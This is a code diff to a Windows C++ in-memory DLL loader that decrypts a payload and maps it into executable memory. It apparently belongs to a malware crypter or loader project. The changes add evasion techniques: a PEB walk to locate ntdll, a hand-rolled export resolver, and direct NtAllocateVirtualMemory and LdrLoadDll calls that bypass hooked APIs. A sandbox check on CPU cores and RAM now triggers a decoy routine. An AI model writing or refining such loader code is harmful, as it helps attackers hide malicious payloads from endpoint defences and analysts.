@@ -3,14 +3,18 @@
 #include <iostream>
 #include <fstream>
 #include <vector>
+#include <wchar.h>
 #include <regex>
+#include <winternl.h>
 #include "sample.h"
+#include "pi.h"
 #include "config.h"
 
 HMODULE hModule2;
 LPVOID lpReserved2;
 
 #define NEW_ADDRESS 0x00
+#define NtCurrentProcess()        ((HANDLE)(LONG_PTR)-1)
 
 // Define a macro for the debug printf
 #ifdef _DEBUG
@@ -50,6 +54,66 @@ void decrypt(const char* key, int offset = 0, int limit = -1) {
 	//END
 }
 
+void *my_GetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
+    //START
+    if (hModule == NULL) {
+        return NULL;
+    }
+
+    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
+    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+        return NULL;
+    }
+
+    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);
+    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
+        return NULL;
+    }
+
+    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    DWORD* nameRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
+    DWORD* addrRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
+    WORD* ordinals = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
+
+    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
+        const char* functionName = (const char*)((BYTE*)hModule + nameRVAs[i]);
+        if (strcmp(functionName, lpProcName) == 0) {
+            DWORD funcRVA = addrRVAs[ordinals[i]];
+            void* funcPtr = (void*)((BYTE*)hModule + funcRVA);
+            return funcPtr;
+        }
+    }
+    return NULL;
+    //END
+}
+
+typedef NTSTATUS (NTAPI *NtAllocateVirtualMemoryPtr)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
+typedef NTSTATUS (NTAPI *LdrLoadDllPtr)(PWCHAR, ULONG, PUNICODE_STRING, PHANDLE);
+typedef NTSTATUS (NTAPI *RtlInitUnicodeStringPtr)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
+
+
+void* get_ntfunction(const char* func) {
+    //START
+#ifdef _M_X64
+    PTEB tebPtr = reinterpret_cast<PTEB>(__readgsqword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
+#else
+    PTEB tebPtr = reinterpret_cast<PTEB>(__readfsdword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
+#endif
+    
+    PPEB_LDR_DATA ldrData = tebPtr->ProcessEnvironmentBlock->Ldr;
+    PLIST_ENTRY moduleList = &(ldrData->InMemoryOrderModuleList);
+    HMODULE hntdll = 0;
+    for (PLIST_ENTRY entry = moduleList->Flink; entry != moduleList; entry = entry->Flink) {
+        LDR_DATA_TABLE_ENTRY* module = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+        if (wcsstr(module->FullDllName.Buffer, L"ntdll.dll") != nullptr) {
+            hntdll = reinterpret_cast<HMODULE>(module->DllBase);
+            break;
+        }
+    }
+    return my_GetProcAddress(hntdll, func);
+    //END
+}
+
 // This function will load a DLL from a buffer into the current process.
 // The DLL is expected to be in the PE format.
 //
@@ -82,8 +146,11 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
 
     const size_t image_size = nt_headers->OptionalHeader.SizeOfImage;
     void* image_base = (LPVOID)newBase;
-    image_base = VirtualAlloc(image_base, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (image_base == NULL) {
+    ULONG allocation_type = MEM_COMMIT | MEM_RESERVE;
+    ULONG protect = PAGE_EXECUTE_READWRITE;
+    NtAllocateVirtualMemoryPtr nta = (NtAllocateVirtualMemoryPtr)get_ntfunction("NtAllocateVirtualMemory");
+    NTSTATUS s = nta(NtCurrentProcess(), &image_base, 0, (PSIZE_T)&image_size, allocation_type, protect);
+    if (image_base == NULL || s != 0) {
         return NULL;
     }
 
@@ -109,10 +176,21 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
     const IMAGE_IMPORT_DESCRIPTOR* import_directory = reinterpret_cast<const IMAGE_IMPORT_DESCRIPTOR*>(static_cast<const char*>(image_base) + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
     DEBUG_PRINTF("[+] Fixing imports\n");
 
+    RtlInitUnicodeStringPtr r = (RtlInitUnicodeStringPtr)get_ntfunction("RtlInitUnicodeString");
+    LdrLoadDllPtr ldr = (LdrLoadDllPtr)get_ntfunction("LdrLoadDll");
     while (import_directory->Name != 0) {
         const char* import_dll_name = static_cast<const char*>(image_base) + import_directory->Name;
 
-        HMODULE import_dll = LoadLibraryA(import_dll_name);
+        HMODULE import_dll = 0; // LoadLibraryA(import_dll_name);
+        int len = MultiByteToWideChar(CP_UTF8, 0, import_dll_name, -1, nullptr, 0);
+        wchar_t* wide = new wchar_t[len];
+        MultiByteToWideChar(CP_UTF8, 0, import_dll_name, -1, wide, len);
+        UNICODE_STRING dll;
+
+        r(&dll, wide);
+        ldr(0, 0, &dll, (PVOID *)&import_dll);
+        delete[] wide;
+
         if (import_dll == NULL) {
             return NULL;
         }
@@ -123,7 +201,7 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
 			if (IMAGE_SNAP_BY_ORDINAL(import_thunk_data->u1.Ordinal)) {
 				DWORD ordinal = IMAGE_ORDINAL(import_thunk_data->u1.Ordinal);
 
-				void* import_address = GetProcAddress(import_dll, reinterpret_cast<LPCSTR>(ordinal));
+				void* import_address = my_GetProcAddress(import_dll, reinterpret_cast<LPCSTR>(ordinal));
 
 				if (import_address != nullptr) {
 					*reinterpret_cast<void**>(import_thunk_data) = import_address;
@@ -132,7 +210,7 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
 			else {
 				const IMAGE_IMPORT_BY_NAME* import_by_name = reinterpret_cast<const IMAGE_IMPORT_BY_NAME*>(static_cast<const char*>(image_base) + import_thunk_data->u1.AddressOfData);
 
-				void* import_address = GetProcAddress(import_dll, reinterpret_cast<const char*>(import_by_name->Name));
+				void* import_address = my_GetProcAddress(import_dll, reinterpret_cast<const char*>(import_by_name->Name));
 
 				if (import_address != nullptr) {
 					*reinterpret_cast<void**>(import_thunk_data) = import_address;
@@ -207,24 +285,6 @@ void allo() {
 	//END
 }
 
-LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
-    //START
-    switch (uMsg) {
-        case WM_DESTROY:
-            PostQuitMessage(0);
-            return 0;
-        case WM_PAINT: {
-            PAINTSTRUCT ps;
-            HDC hdc = BeginPaint(hwnd, &ps);
-            FillRect(hdc, &ps.rcPaint, (HBRUSH) (COLOR_WINDOW + 1));
-            EndPaint(hwnd, &ps);
-            return 0;
-        } default:
-            return DefWindowProc(hwnd, uMsg, wParam, lParam);
-    }
-    //END
-}
-
 #ifdef _DEBUG
 int main(void)
 #else
@@ -250,6 +310,7 @@ int __stdcall WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR     lpCm
     DWORD numProcessorCores = systemInfo.dwNumberOfProcessors;
     if (numProcessorCores < 2 || (int)totalPhysicalMemoryGB < 4) {
         MessageBoxA(NULL, "uwu", "failed", 0);
+        spigot();
         return 0;
     }
 
